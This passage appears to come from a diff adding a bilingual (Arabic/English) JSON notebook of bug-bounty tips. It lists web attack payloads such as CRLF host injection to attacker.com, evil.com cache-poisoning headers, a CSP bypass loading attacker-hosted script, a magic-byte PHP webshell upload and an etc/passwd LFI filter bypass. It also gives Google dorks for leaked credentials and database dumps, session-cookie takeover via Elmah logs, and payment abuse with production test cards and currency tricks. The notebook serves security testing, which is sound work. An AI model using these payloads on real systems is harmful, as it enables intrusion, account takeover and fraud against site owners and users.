+    "Status": "Not started",
+    "How It Works": "Some backends treat special values as \"all objects\" or skip ownership checks when the ID is not a normal UUID/integer. Replace the object ID with *, all, any, 0, -1, null, empty string, or undefined. Also try path tricks (../users/victim, trailing / or ?). High impact when it returns mass data or allows mass modification.",
+    "Payload / Code": "GET /api/users/*\nGET /api/users/all\nGET /api/users/0\nGET /api/users/-1\nGET /api/users/null\nGET /api/users/\n\nAlso: id=*, id[], id[0]=victim",
+    "Source": "Twitter/X @yogsec — BOLA via Wildcard & Special ID Values (Nov 2026)"
+  },
+  {
+    "Title": "Broken Access: function-level (access admin endpoint as normal user)",
+    "Category": "[\"Auth Bypass\",\"IDOR\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "مش IDOR object، ده endpoint كامل. جرب /admin/, /api/internal/, /manage/* بسيشن يوزر عادي.",
+    "Payload / Code": "As low-priv user: GET /api/admin/users or /internal/config",
+    "Source": "Broken Access Control 2026 blueprint"
+  },
+  {
+    "Title": "Business Logic: Bypass الأسعار بتلاعب العملات (Currency Confusion)",
+    "Category": "[\"General\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "الأنظمة اللي بتتعامل مع أكتر من عملة بتستخدم exchange rate function. لو مفيش تحقق كويس، جرّب تغيّر العملة لعملة أضعف (زي INR أو JPY) وشوف هل السعر النهائي بيتحسب صح ولا لأ — ممكن تشتري بسعر أقل بكتير من قيمة المنتج الحقيقية.",
+    "Payload / Code": "لو فيه param اسمه currency أو lang بيتحكم في الـ pricing، جرّب:\ncurrency=INR بدل currency=USD (مع نفس السعر الرقمي)\nوشوف هل السيرفر بيحول العملة صح أو لأ",
+    "Source": "Intigriti Official — 31 Bug Bounty Tips 2026 (Tip 20)"
+  },
+  {
+    "Title": "Business Logic: race on wallet / coupon / referral",
+    "Category": "[\"General\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "race condition على discount, referral credit, wallet top-up, أو one-time coupon. Turbo Intruder.",
+    "Payload / Code": "Send many parallel requests on apply-coupon / claim-referral",
+    "Source": "Top bugs 2026 + real cases"
+  },
+  {
+    "Title": "Bypass 403 Forbidden بإضافة X-Client-IP: 127.0.0.1",
+    "Category": "[\"WAF Bypass\",\"Recon\"]",
+    "Rating": "⭐ جيدة",
+    "Status": "Not started",
+    "How It Works": "بعض الـ WAFs أو الـ access control بيعتمد على headers بتوضح IP الطلب (زي X-Client-IP)، لو ضفت header بيقول إن الطلب جاي من localhost، السيرفر ممكن يعاملك كأنك مستخدم موثوق ويديك wall bypass لفتح 403 محمي.",
+    "Payload / Code": "X-Client-IP: 127.0.0.1\n\nمثال تنفيذي:\ncurl -I https://target[.]com/.env -H \"X-Client-IP: 127.0.0.1\"\n\nالنتيجة المتوقعة: 403 يبقى 302/200 بعد إضافة الـ header",
+    "Source": "kjulius @ethical_h4ck3r_"
+  },
+  {
+    "Title": "Bypass File Upload Validation بـ Magic Bytes",
+    "Category": "[\"General\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "بعض الأنظمة بتتحقق من أول بايتات فقط في الملف المرفوع (Magic Bytes/File Signature) بدون ما تفحص كل الملف. لو حطيت Magic Bytes بتاعة PNG/JPG في أول الملف وبعدين حطيت كود ضار (webshell)، الفاليديشن بتعدية بتقبله — ويتنفّذ لو السيرفر بيمشيه بامتداد الملف الأصلي.",
+    "Payload / Code": "مثال: ابدأ الملف بـ magic bytes PNG (x89PNGrnx1an) ثم ضيف كود الـ PHP shell بعدين\nدمجها مع double extension: shell.png.php أو content-type manipulation لنتيجة أقوى",
+    "Source": "Intigriti Official — 31 Bug Bounty Tips 2026 (Tip 19)"
+  },
+  {
+    "Title": "Bypass الدفع بالـ Test Cards المنسية في Production",
+    "Category": "[\"General\"]",
+    "Rating": "⭐ جيدة",
+    "Status": "Not started",
+    "How It Works": "بعض المطورين بينسوا يشيلوا test cards بتاعة payment gateways (Stripe, PayPal) في الـ Production. لو اشتغلت، ممكن تعمل orders بدون ما تتخصم فلوس.",
+    "Payload / Code": "jarrib cards معروفة زي: 4242 4242 4242 4242 (Stripe test card) على الـ production checkout",
+    "Source": "Intigriti Official — 31 Bug Bounty Tips 2026 (Tip 22)"
+  },
+  {
+    "Title": "Bypass الـ WAF عبر إيجاد الـ Origin IP",
+    "Category": "[\"WAF Bypass\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "كتير من المواقع مخبية ورا Cloudflare أو WAF تاني. لو لقيت IP السيرفر الأصلي (origin) من سجلات DNS قديمة أو certificate transparency logs (قبل ما يطبقوا الـ protection)، تقدر تتعامل مع السيرفر مباشرة بدون ما الـ WAF يشوف أي payload.",
+    "Payload / Code": "1) دور على الـ IP الأصلي في crt.sh أو سجلات قديمة (SecurityTrails, ViewDNS)\n2) ارفع الـ request مباشرة للـ IP مع Host header = target.com\n3) لو السيرفر رد عليك، اختبر الـ payloads مباشرة بدون ما يتفلتر من الـ WAF",
+    "Source": "Intigriti Official — 31 Bug Bounty Tips 2026 (Tip 10)"
+  },
+  {
+    "Title": "Bypass فلاتر القيم بالـ Base64 Encoding (SQL/SSTI/XSS/LFI)",
+    "Category": "[\"General\",\"WAF Bypass\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "بعض الفلاتر بتدور على قيم (strings) معينة zي أسماء ملفات النظام أو الكلمات المحظورة، لو encode القيمة بـ base64 قبل ما تحطها في الباراميتر، الفلتر مش بيعرفها فبيسمحلها تعدي، لحد ما تتفك جوه الباكيند.",
+    "Payload / Code": "url/?f=etc/passwd → 403 (محظور)\n\nencode etc/passwd كـ base64: L2V0Yy9wYXNzd2Q=\n\nurl/?f=L2V0Yy9wYXNzd2Q= → 200 ✅\n\n#note: التقنية دي قابلة للاستخدام في SQL, SSTI, XSS, LFI وغيرها",
+    "Source": "kjulius @ethical_h4ck3r_ (Pinned) — Credit: @GodfatherOrwa"
+  },
+  {
+    "Title": "Bypass قيود الوصول بتغيير حروف الـ Path (Case Sensitivity)",
+    "Category": "[\"WAF Bypass\",\"Recon\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "بعض الأنظمة (case-sensitive routing) بتفرق في الرد بين الحروف الكبيرة والصغيرة في الـ path، فلو الـ lowercase محطوط أو محمي، جرّب نفس الـ path بحروف مختلفة (Camel/Mixed case) لأن الـ rule اللي بتمنع الوصول بتكون case-sensitive لكن الـ backend مش case-sensitive.",
+    "Payload / Code": "target[.]com/phpmyadmin/setup/index.php → 301 (راجع للوجن)\ntarget[.]com/phpMyAdmin/setup/index.php → 200 (فتح صفحة setup مباشرة!)\n\nphpmyadmin → 301\nphpMyAdmin → 200",
+    "Source": "kjulius @ethical_h4ck3r_ — Credit: @GodfatherOrwa"
+  },
+  {
+    "Title": "Cache Poisoning via Unkeyed Headers (X-Forwarded-Host / X-Forwarded-Scheme)",
+    "Category": "[\"API Hacking\",\"XSS\",\"General\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "Inject a header the cache does not key on but the application uses for redirects, absolute URLs, or asset generation (X-Forwarded-Host, X-Forwarded-Scheme, X-Original-URL, etc.). If the response is cached with your injected value, subsequent users receive poisoned content (open redirect, XSS, or wrong origin). One request can affect many users.",
+    "Payload / Code": "X-Forwarded-Host: evil.com\nX-Forwarded-Scheme: http\nX-Original-URL: /evil\n\nThen force cache hit and observe Location / script src / link tags reflecting the poisoned host.",
+    "Source": "Twitter/X @gustavorobertux — Bug Bounty Tip #19/30 Cache poisoning (Nov 2026) + classic PortSwigger patterns"
+  },
+  {
+    "Title": "Casdoor — token exchange must bind JWT identity to the target organization",
+    "Category": "[\"Auth Bypass\",\"API Hacking\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "The reported Casdoor issue involved token exchange validating a JWT signature without verifying that the token's user belonged to the same organization as the target application. A valid token from one organization could cross an organization boundary if the missing binding check and affected versions were present.",
+    "Payload / Code": "For an authorized lab with two test organizations and accounts, test whether token exchange enforces both signature validity and organization/tenant membership. Use only test identities and non-sensitive scopes; record the subject, issuer, organization, target app, and resulting permissions. Do not replay real users' tokens. Advisory says affected versions were fixed in 2.387.0.",
+    "Source": "GitHub Advisory GHSA-c9w5-qp6m-m395 (CVE-2026-9094): https://github.com/advisories/GHSA-c9w5-qp6m-m395"
+  },
+  {
+    "Title": "Client-side role / isAdmin / price tampering — verify server-side enforcement",
+    "Category": "[\"API Hacking\",\"Auth Bypass\"]",
+    "Rating": "⭐ جيدة",
+    "Status": "Not started",
+    "How It Works": "Changing client-side values such as isAdmin, role, isAuthenticated, or price matters only if the server trusts them when authorizing an action or calculating a security-sensitive value. UI-only changes are not proof of a vulnerability.",
+    "Payload / Code": "With an explicitly authorized test account and test data, compare the normal request with a controlled change to a client-controlled field. Verify server-side behavior using only actions and records you own. Do not modify real purchases, payments, roles, or other users' data.",
+    "Source": "User-provided screenshot: response manipulation / role and price fields; normalized into a server-side authorization check"
+  },
+  {
+    "Title": "Cloudflare R2.dev public access left on → data exposure",
+    "Category": "[\"Recon\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "Cloudflare R2 buckets ممكن تتفتح عبر R2.dev للتجربة. لو المطور نسي يقفلها، تقدر توصل للـ objects بدون auth. دور على *.r2.dev أو CNAME لـ R2.",
+    "Payload / Code": "https://bucket-name.account-id.r2.dev/\n# أو ابحث عن r2.dev في JS / DNS",
+    "Source": "Intigriti complete guide (updated 2026)"
+  },
+  {
+    "Title": "Cloudflare Worker/API Key Exposure → Edge JavaScript Supply-Chain Injection",
+    "Category": "[\"Recon\",\"API Hacking\",\"General\"]",
+    "Rating": "⭐ جيدة",
+    "Status": "Not started",
+    "How It Works": "A September 2026 incident showed how a broad Cloudflare API key exposed in application source could be used to create Workers, routes, and DNS changes, allowing JavaScript to be modified at the edge without changing the origin. The hunting lesson is to treat exposed CDN/edge credentials and third-party script delivery as a chain: source/config leak → edge control-plane access → route or Worker modification → customer-facing script integrity impact. Study Tab: JS/config/source maps → search for CDN or edge-provider credentials and deployment references → edge control-plane abuse → validate scope, permissions, and harmless response-integrity differences. Use when: a target uses Cloudflare Workers, Pages, CDN-managed scripts, or embeds third-party JavaScript across many customer sites.",
+    "Payload / Code": null,
+    "Source": "BreachHistory / Brevo incident analysis — 14–15 Sep 2026 — https://breachhistory.com/blog/brevo-cloudflare-clickfix-supply-chain-september-2026"
+  },
+  {
+    "Title": "Common debug / admin panels on non-standard ports or staging",
+    "Category": "[\"Recon\"]",
+    "Rating": "⭐ جيدة",
+    "Status": "Not started",
+    "How It Works": "دور على /_debug, /debug, /actuator, /console, /manager/html على staging أو بورتات تانية.",
+    "Payload / Code": "/_debug\n/debug\n/console\n/manager/html\n/actuator",
+    "Source": "Security Misconfiguration Hunting 2026"
+  },
+  {
+    "Title": "composer.phar / phar archives as Info Disclosure",
+    "Category": "[\"Recon\"]",
+    "Rating": "⭐ جيدة",
+    "Status": "Not started",
+    "How It Works": "أضف /composer.phar لقوائم الـ content discovery. لو موجود و readable، استخدم pharfiletool لاستخراج المحتوى (كود أو metadata).",
+    "Payload / Code": "https://target.com/composer.phar\n# ثم pharfiletool extract",
+    "Source": "nooh zidan tip + hunters"
+  },
+  {
+    "Title": "config.php / settings.py / application.properties / appsettings.json exposed",
+    "Category": "[\"Recon\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "ملفات الكونفيج دي غالبًا فيها DB credentials أو API keys. جرب الأسماء الشائعة + .bak/.old.",
+    "Payload / Code": "config.php, settings.py, application.properties, appsettings.json, database.php, conn.php",
+    "Source": "Common config file leaks"
+  },
+  {
+    "Title": "Connectivity Check → cURL Shell Injection; Then Pivot to Sibling Features",
+    "Category": "[\"RCE\",\"Fuzzing\"]",
+    "Rating": "⭐ جيدة",
+    "Status": "Not started",
+    "How It Works": "A recent disclosed-research roundup highlighted a command-injection chain in which a connectivity-check feature passed a user-supplied URL to cURL through a shell; a second feature reused the same risky path. The practical hunting signal is any “test URL”, webhook connectivity check, fetch preview, or network diagnostic that shells out to curl/wget. If one instance is confirmed, inspect other in-scope features that share the same backend helper or implementation instead of stopping at the first entry point.",
+    "Payload / Code": "Authorized, low-impact workflow:\n1. Identify a URL/connectivity-test feature and determine whether errors or timing indicate a shell invocation (this alone is not proof).\n2. Use a controlled endpoint and harmless metacharacter probes in a test environment or explicitly permitted target; avoid destructive commands, file writes, or outbound calls to third parties.\n3. Confirm execution with a harmless, unique marker that cannot change state, and preserve the raw request/response evidence.\n4. After confirmation, compare sibling features (webhook test, integration test, health check) for shared behavior using the same safe marker.\n5. Stop after minimal proof; report each affected entry point and shared root cause without broad automation.",
+    "Source": "Intigriti Bug Bytes #240 (Sep 2026), citing researcher @saur1n, “A valid URL with a Command in its Shadow”: https://www.intigriti.com/researchers/blog/bug-bytes/intigriti-bug-bytes-240-september-2026"
+  },
+  {
+    "Title": "CORS Bypass عبر Whitelisted Third-Party Origins",
+    "Category": "[\"CSRF\",\"General\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "بعض الأنظمة بتعمل whitelist لـ domains زي GitHub Pages, CodePen, Replit للتطوير لكن بتنسى تشيلهم في Production. استضيف الـ PoC بتاعك على أي من الـ domains دي واعمل cross-origin request تتجاوز CORS لأنها موثوقة.",
+    "Payload / Code": "1) افحص Access-Control-Allow-Origin في الـ response headers\n2) لو فيه domains زي *.github.io أو codepen.io مسموحة\n3) استضيف fetch() PoC على نفس الـ domain ده واسحب البيانات",
+    "Source": "Intigriti Official — 31 Bug Bounty Tips 2026 (Tip 31)"
+  },
+  {
+    "Title": "CORS null origin + Allow-Credentials: true → data theft",
+    "Category": "[\"API Hacking\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "لو الـ response بيرجع Access-Control-Allow-Origin: null مع Credentials true، تقدر من sandboxed iframe أو data: URI تسحب البيانات الحساسة.",
+    "Payload / Code": "Origin: null\n# شوف لو ACAO: null و ACAC: true",
+    "Source": "Intigriti CORS advanced guide 2025/2026"
+  },
+  {
+    "Title": "CORS origin reflection + credentials = data theft",
+    "Category": "[\"General\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "لو Access-Control-Allow-Origin بيعكس الـ Origin و Access-Control-Allow-Credentials: true → تقدر تسرق responses من متصفح الضحية.",
+    "Payload / Code": "Origin: https://evil.com\n(Check response headers for ACAO + ACAC)",
+    "Source": "Undercode + recent CVEs 2026"
+  },
+  {
+    "Title": "CRLF in password reset to inject Host",
+    "Category": "[\"Password Reset\"]",
+    "Rating": "⭐ جيدة",
+    "Status": "Not started",
+    "How It Works": "CRLF injection في باراميتر الريست عشان تحقن Host header في اللينك.",
+    "Payload / Code": "/reset?%0d%0aHost:%20attacker.com",
+    "Source": "Password Reset Checklist 2026"
+  },
+  {
+    "Title": "crossdomain.xml / clientaccesspolicy.xml permissive → Flash/Silverlight origin issues",
+    "Category": "[\"Recon\"]",
+    "Rating": "📌 للمراجعة",
+    "Status": "Not started",
+    "How It Works": "لو الملف بيسمح لأي domain (*)، ممكن يستخدم في بعض الـ legacy attacks أو كـ info disclosure عن الـ allowed origins.",
+    "Payload / Code": "https://target.com/crossdomain.xml\nhttps://target.com/clientaccesspolicy.xml",
+    "Source": "Older but still checked in some programs"
+  },
+  {
+    "Title": "CSP Bypass عبر JSONP/Scripts على Domains موثوقة",
+    "Category": "[\"XSS\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "لو الـ CSP بيسمح بـ domain موثوق (زي Google، GitHub، أو CDN معين)، دور على endpoint فيه JSONP أو script قديم فيه gadget على نفس الـ domain — بيسمحلك تنفذ JS من داخل الـ whitelist بدون ما الـ CSP يمنع.",
+    "Payload / Code": "CSP مثال: script-src 'self' https://cdn.jsdelivr.net\n\nExploit:\n<script src=\"https://cdn.jsdelivr.net/gh/attacker/xss-payload@main/payload.js\"></script>\n\nأو دور على JSONP endpoint على نفس الـ domain المسموح",
+    "Source": "Intigriti Official 2026 (Tip 15) + Redfox Security 2026"
+  },
+  {
+    "Title": "CSRF token bypass via HTTP method override",
+    "Category": "[\"CSRF\",\"Auth Bypass\"]",
+    "Rating": "⭐ جيدة",
+    "Status": "Not started",
+    "How It Works": "Some apps only enforce CSRF tokens on POST. Switching method to GET with X-HTTP-Method-Override: POST, or using PUT/DELETE, can skip the token check while the backend still performs the state change. Confirm SameSite and cookie behavior; only test authorized actions on your accounts.",
+    "Payload / Code": "Original: POST /change-email with CSRF token\nTest: GET /change-email?email=attacker@x.com\nHeader: X-HTTP-Method-Override: POST\nAlso try: X-HTTP-Method: PUT , _method=POST form field",
+    "Source": "Twitter/X @yogsec — CSRF Token Bypass via Method Override (Nov 2026)"
+  },
+  {
+    "Title": "CSRF في GraphQL Targets",
+    "Category": "[\"CSRF\"]",
+    "Rating": "⭐ جيدة",
+    "Status": "Not started",
+    "How It Works": "GraphQL مالوش فيها حماية مدمجة ضد CSRF. لو لقيت طلب بيغير حالة بدون token، والـ backend بيقبل content-type غير JSON، تقدر تعمل CSRF form عادي ليه.",
+    "Payload / Code": "1) لاقي mutation بيغير حالة مش محتاج token\n2) غيّر content-type من application/json إلى application/x-www-form-urlencoded\n3) اعمل form html بتبعت الـ mutation body مباشرة",
+    "Source": "Intigriti Official — 31 Bug Bounty Tips 2026 (Tip 30)"
+  },
+  {
+    "Title": "Default-ish admin password pattern: admin / [company]12345",
+    "Category": "[\"Auth Bypass\"]",
+    "Rating": "⭐ جيدة",
+    "Status": "Not started",
+    "How It Works": "Some internal or legacy admin panels still use predictable defaults built from the company name. Only test on in-scope login surfaces with program-allowed credentials testing; never spray broadly.",
+    "Payload / Code": "Username: admin\nPassword candidates (examples only):\n[company]12345\n[company]1234\n[Company]@123\nadmin@[company]\n\nPrefer single-target manual checks over mass spraying. Log only whether login succeeded for your test account scope.",
+    "Source": "Mohamed Ahmed — default password tip"
+  },
+  {
+    "Title": "Different 404 Fingerprint → Look for a Separate Backend API Context",
+    "Category": "[\"Recon\",\"API Hacking\"]",
+    "Rating": "⭐ جيدة",
+    "Status": "Not started",
+    "How It Works": "A useful clue from Berserker's write-up: malformed or unusual paths produced a 404 response with a different structure from the normal frontend 404. That suggested the request had reached a different routing/backend layer. The researchers then inspected public JavaScript for a production API hostname and found that it exposed the same API behind a different edge configuration. Treat response differences as a lead, not proof of a bypass: frameworks, gateways, and error handlers can also produce different 404s.",
+    "Payload / Code": "Passive-first workflow for an in-scope target:\n1. Save one normal 404 response and one response from a harmless, invalid route; compare body template, headers, server/framework fingerprints, and request IDs.\n2. Inspect publicly served JavaScript and source maps for API base URLs, service hostnames, version prefixes, and environment-specific endpoints.\n3. Compare documented/public API surfaces on discovered in-scope hostnames; look for OpenAPI/WADL metadata only where access is permitted.\n4. If a separate backend is found, verify its ownership and scope, then test authorization using your own account and harmless resources.\n5. Report only a demonstrated security difference; a distinct 404 or a hostname difference alone is not a vulnerability.",
+    "Source": "https://medium.com/@Berserker1337/secondary-context-leads-to-company-takeover-0dc88ca751ea"
+  },
+  {
+    "Title": "Directory listing enabled (especially /wp-content, /uploads, /backup)",
+    "Category": "[\"Recon\"]",
+    "Rating": "⭐ جيدة",
+    "Status": "Not started",
+    "How It Works": "لما directory listing مفتوح، تقدر تشوف كل الملفات. ركز على /wp-content/uploads, /backup, /old, /temp.",
+    "Payload / Code": "https://target.com/wp-content/\nhttps://target.com/uploads/",
+    "Source": "Intigriti WordPress guide"
+  },
+  {
+    "Title": "Disable JavaScript → legacy / forgotten form still live",
+    "Category": "[\"Recon\",\"Auth Bypass\"]",
+    "Rating": "⭐ جيدة",
+    "Status": "Not started",
+    "How It Works": "SPA frontends often hide or replace old flows with JS. Turning JS off (or fetching without executing scripts) can expose forgotten HTML forms and endpoints still wired on the server. Bots rarely do this. Use only on authorized targets; document the exact path and impact.",
+    "Payload / Code": "Browser: disable JS → reload sensitive flows (password reset, recovery, signup)\ncurl without following SPA redirects; compare HTML to JS-enabled view\nLook for old form actions still posting to live APIs",
+    "Source": "Twitter/X @dd_pwnd — Google account recovery with JS off loaded an old form that leaked phone numbers ($5k, 2025 story retold 2026)"
+  },
+  {
+    "Title": "Discover quieter bug bounty programs via Slack dork",
+    "Category": "[\"Recon\",\"General\"]",
+    "Rating": "⭐ جيدة",
+    "Status": "Not started",
+    "How It Works": "Many companies publish security/bug bounty status on Slack directories or pages indexed by Google. A simple dork finds program mentions that are less crowded than top HackerOne lists.",
+    "Payload / Code": "site:slack.com \"Has a bug bounty program\"\nsite:slack[.]com \"Has a bug bounty program\"\n\nThen open official policy URL from the page (example pattern: responsible-disclosure pages).",
+    "Source": "AnmolSecSavvy — site:slack.com Has a bug bounty program · Oct 2025"
+  },
+  {
+    "Title": "Django DEBUG=True in production",
+    "Category": "[\"Recon\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "أي 500 error بيرجع full stack trace + local variables (أحيانًا DB credentials).",
+    "Payload / Code": "Trigger 500 (bad param) → look for DEBUG traceback",
+    "Source": "Security Misconfiguration Hunting 2026"
+  },
+  {
+    "Title": "Django DEBUG=True in production → full traceback + settings leak",
+    "Category": "[\"Recon\"]",
+    "Rating": "⭐ جيدة",
+    "Status": "Not started",
+    "How It Works": "لما DEBUG=True، أي error بيرجع full stack + settings (SECRET_KEY أحيانًا). جرب trigger error بـ invalid input.",
+    "Payload / Code": "أرسل parameter غلط أو path مش موجود وشوف الـ response",
+    "Source": "Common misconfig (H1 reports)"
+  },
+  {
+    "Title": "Dork (High Signal): API Docs & Swagger / GraphQL / Redoc",
+    "Category": "[\"API Hacking\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "بيجيب الـ API documentation اللي بتسهل IDOR و auth issues.",
+    "Payload / Code": "site:target.com (inurl:apidocs OR inurl:api-docs OR inurl:swagger OR inurl:api-explorer OR inurl:redoc OR inurl:openapi OR inurl:graphql OR intitle:\"Swagger UI\")",
+    "Source": "Multiple bounty writeups + Intigriti guides"
+  },
+  {
+    "Title": "Dork (High Signal): Cloud buckets linked to target",
+    "Category": "[\"Recon\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "بيجيب S3 / GCS / Firebase المفتوحة المرتبطة بالـ target.",
+    "Payload / Code": "site:s3.amazonaws.com \"target.com\" OR site:storage.googleapis.com \"target\" OR site:firebaseio.com \"target\" OR site:blob.core.windows.net \"target\"",
+    "Source": "Common high-payout vector"
+  },
+  {
+    "Title": "Dork (High Signal): Confidential / Internal documents",
+    "Category": "[\"Recon\"]",
+    "Rating": "⭐ جيدة",
+    "Status": "Not started",
+    "How It Works": "بيجيب PDFs و docs داخلية مكشوفة.",
+    "Payload / Code": "site:target.com (filetype:pdf OR filetype:doc OR filetype:docx OR filetype:xls OR filetype:xlsx OR filetype:csv) (confidential OR \"internal use\" OR \"not for public\" OR \"do not distribute\" OR password OR secret)",
+    "Source": "Proven document dorks"
+  },
+  {
+    "Title": "Dork (High Signal): Database dumps with real content",
+    "Category": "[\"Recon\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "بيركز على dumps فيها INSERT عشان تبقى data فعلية مش أمثلة.",
+    "Payload / Code": "site:target.com (filetype:sql OR ext:sql) (\"INSERT INTO\" OR \"CREATE TABLE\") (password OR email OR user OR credit)",
+    "Source": "SecurityElites 2026 + real $ cases"
+  },
+  {
+    "Title": "Dork (High Signal): Error / Stack Trace / SQL errors",
+    "Category": "[\"Recon\"]",
+    "Rating": "⭐ جيدة",
+    "Status": "Not started",
+    "How It Works": "بيجيب صفحات أخطاء فيها paths أو DB info أو stack traces.",
+    "Payload / Code": "site:target.com (\"sql syntax\" OR \"warning: mysql\" OR \"stack trace\" OR \"undefined index\" OR \"unhandled exception\" OR \"server error\" OR \"exception\")",
+    "Source": "Hacklido + classic info disclosure"
+  },
+  {
+    "Title": "Dork (High Signal): Full juicy extensions dump",
+    "Category": "[\"Recon\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "أشهر دورك بيجيب ملفات حساسة مكشوفة. استخدمه مع site:target.com.",
+    "Payload / Code": "site:target.com (ext:log OR ext:txt OR ext:conf OR ext:cnf OR ext:ini OR ext:env OR ext:sh OR ext:bak OR ext:backup OR ext:swp OR ext:old OR ext:~ OR ext:git OR ext:svn OR ext:htpasswd OR ext:htaccess OR ext:json OR ext:yaml OR ext:yml OR ext:pem OR ext:key)",
+    "Source": "Proven lists (1BlackLine / reewardius / SecurityElites 2026)"
+  },
+  {
+    "Title": "Dork (High Signal): Index of with sensitive names",
+    "Category": "[\"Recon\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "بيجيب open directories اللي فيها ملفات حساسة.",
+    "Payload / Code": "site:target.com intitle:\"index of\" (.env OR .git OR backup OR config OR admin OR private OR sql OR dump OR credentials)",
+    "Source": "Classic still paying + 2026 lists"
+  },
+  {
+    "Title": "Dork (High Signal): Test / Staging / Dev environments",
+    "Category": "[\"Recon\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "البيئات دي غالباً أضعف حماية وبتجيب secrets أسهل.",
+    "Payload / Code": "site:target.com (inurl:test OR inurl:dev OR inurl:staging OR inurl:sandbox OR inurl:debug OR inurl:temp OR inurl:internal OR inurl:demo OR inurl:qa)",
+    "Source": "taksec + common bounty wins"
+  },
+  {
+    "Title": "Dork (High Signal): wp-config / PHP config backups",
+    "Category": "[\"Recon\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "ملفات الكونفيج دي غالباً فيها DB credentials.",
+    "Payload / Code": "site:target.com (wp-config.php OR \"wp-config.php.bak\" OR \"wp-config.php~\" OR \"wp-config.php.old\" OR config.php.bak OR configuration.php)",
+    "Source": "Classic WordPress + PHP wins"
+  },
+  {
+    "Title": "Dork (Lesser-known): Bing IP-based search for exposed files",
+    "Category": "[\"Recon\"]",
+    "Rating": "⭐ جيدة",
+    "Status": "Not started",
+    "How It Works": "Bing بيدعم ip: وده Google مش بيعمله. لو عندك IP للـ target، دور على الملفات المكشوفة عليه.",
+    "Payload / Code": "ip:TARGET_IP (filetype:env OR filetype:sql OR filetype:bak OR filetype:log OR \"DB_PASSWORD\")",
+    "Source": "Medium 2026 - Bing advantage over Google"
+  },
+  {
+    "Title": "DorkAgent — automate scoped dork research",
+    "Category": "[\"Recon\"]",
+    "Rating": "⭐ جيدة",
+    "Status": "Not started",
+    "How It Works": "أداة لتجميع/تشغيل عمليات dorking بصورة منظمة. استخدمها فقط على اسم المؤسسة أو النطاقات المصرح بها، وراجع كل نتيجة يدويًا: هل هي أصل حالي؟ هل السر حقيقي أم مثال/fixture؟ هل يوجد دليل على ملكية الهدف؟ لا تستخدم أي credentials مكشوفة.",
+    "Payload / Code": "Repository: https://github.com/yee-yore/DorkAgent\\nWorkflow: define in-scope domain/org → run passive queries → deduplicate results → manually validate → redact secrets in notes.",
+    "Source": "https://github.com/yee-yore/DorkAgent"
+  },
+  {
+    "Title": "Elasticsearch / Kibana open (no auth) → full data dump",
+    "Category": "[\"Recon\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "من Shodan أو port 9200/5601. جرب /_cat/indices أو /_search. لو مفيش auth، اقدر تسحب كل الـ indices (PII، logs، secrets).",
+    "Payload / Code": "curl http://target:9200/_cat/indices\ncurl http://target:9200/_search?pretty",
+    "Source": "elasticpwn tool + Shodan common findings"
+  },
+  {
+    "Title": "Elmah.axd / ASP.NET error log exposed",
+    "Category": "[\"Recon\"]",
+    "Rating": "⭐ جيدة",
+    "Status": "Not started",
+    "How It Works": "بيسرب stack traces، paths، وأحيانًا credentials أو session data.",
+    "Payload / Code": "https://target.com/elmah.axd\nhttps://target.com/elmah.axd/detail?id=...",
+    "Source": "Classic still found + security misconfig guides"
+  },
+  {
+    "Title": "Elmah.axd /elmah → Session cookies → Employee ATO ($6,000 escalation case)",
+    "Category": "[\"Recon\",\"Auth Bypass\"]",
+    "Rating": "📌 للمراجعة",
+    "Status": "Not started",
+    "How It Works": "ضيف /elmah و /elmah.axd للكلمة. لو مفتوح، ادخل Details على أي log → هتلاقي full HTTP request بما فيها session cookies. خد الكوكي وجربه على الـ main site → غالباً employee أو admin ATO. لو الـ logs فاضية، راقبها ساعات لأن ساعات بتمسح hourly.",
+    "Payload / Code": "https://target.com/elmah.axd\nhttps://target.com/elmah",
+    "Source": "Jayesh Madnani tip – $6000 from escalating Elmah disclosure"
+  },
+  {
+    "Title": "Empty API response subdomain → still try full Swagger paths",
+    "Category": "[\"Recon\",\"API Hacking\"]",
+    "Rating": "⭐ جيدة",
+    "Status": "Not started",
+    "How It Works": "حتى لو الـ API subdomain بيرجع empty body، جرب المسارات الكاملة لـ Swagger: /swagger-ui.html /swagger/index.html /api/swagger-ui.html /v1/swagger-ui.html /swagger/swagger-ui.html",
+    "Payload / Code": "ffuf -u https://api.target.com/FUZZ -w swagger_paths.txt -mc 200",
+    "Source": "Book of BugBounty Tips"
+  },
+  {
+    "Title": "Escalate the finding: SSRF→RCE, Self-XSS→Clickjacking/CSRF, misconfig chains",
+    "Category": "[\"General\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
